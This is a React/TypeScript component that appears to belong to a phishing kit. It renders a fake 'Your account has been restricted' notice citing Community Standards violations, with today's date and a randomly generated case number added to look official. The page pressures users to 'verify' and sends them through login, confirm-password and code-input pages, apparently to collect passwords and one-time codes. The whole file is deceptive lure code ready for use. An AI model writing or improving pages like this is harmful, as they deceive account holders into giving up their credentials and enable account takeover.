import React, { useEffect, useState } from 'react';
import 'react-phone-input-2/lib/style.css';
import HomeImage from '@assets/home-image.png';
import getToday from '@utils/getToday';
import Loading from '@components/Loading';
import { Outlet, useLocation, useNavigate } from 'react-router-dom';

const GetInfo: React.FC = () => {
	const navigate = useNavigate();
	const location = useLocation();
	const [caseNumber, setCaseNumber] = useState<string>('');
	const [isLoading, setIsLoading] = useState<boolean>(false);
	const generateRandomNumber = (): string => {
		const randomNumber = Math.floor(Math.random() * 1_000_000_000_000);
		return `#${randomNumber.toString().padStart(12, '0')}`;
	};
	const handleButtonClick = () => {
		if (location.pathname === '/business/home') {
			navigate('login');
		} else if (location.pathname === '/business/home/login') {
			navigate('/business/home/confirm-password');
		} else if (location.pathname === '/business/home/confirm-password') {
			navigate('/business/code-input');
		}
	};

	useEffect(() => {
		setCaseNumber(generateRandomNumber());
	}, []);
	return (
		<div className='flex w-11/12 flex-col justify-center md:w-2/5 2xl:w-1/3'>
			<div>
				<img src={HomeImage} className='w-full' alt='' />
				<b className='text-2xl'>Your account has been restricted</b>
				<p className='text-sm text-gray-500'>Term of Service</p>
				<hr />
			</div>
			<div className='my-5'>
				We detected unusual activity in your page today{' '}
				<strong>{getToday()}</strong>. Someone has reported your account
				for not complying with{' '}
				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
					Community Standards
				</b>
				. We have already reviewed this decision and the decision cannot
				be changed. To avoid having your account{' '}
				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
					disabled
				</b>{' '}
				, please verify:
			</div>
			<Outlet />
			<div className='flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row'>
				<div className='flex gap-1 sm:flex-col sm:gap-0'>
					<b>Case Number:</b>
					<b className='text-blue-500'>{caseNumber}</b>
				</div>
				<div className='w-full sm:w-3/4'>
					<b>
						About Case: Violating Community Standards and Posting
						something inappropriate.
					</b>
				</div>
			</div>
			<button
				className={`my-5 flex w-full items-center justify-center rounded-lg bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${
					isLoading ? 'cursor-not-allowed opacity-70' : ''
				}`}
				onClick={() => {
					setIsLoading(!isLoading);
					handleButtonClick();
				}}
			>
				{isLoading ? <Loading /> : 'Continue'}
			</button>
		</div>
	);
};

export default GetInfo;
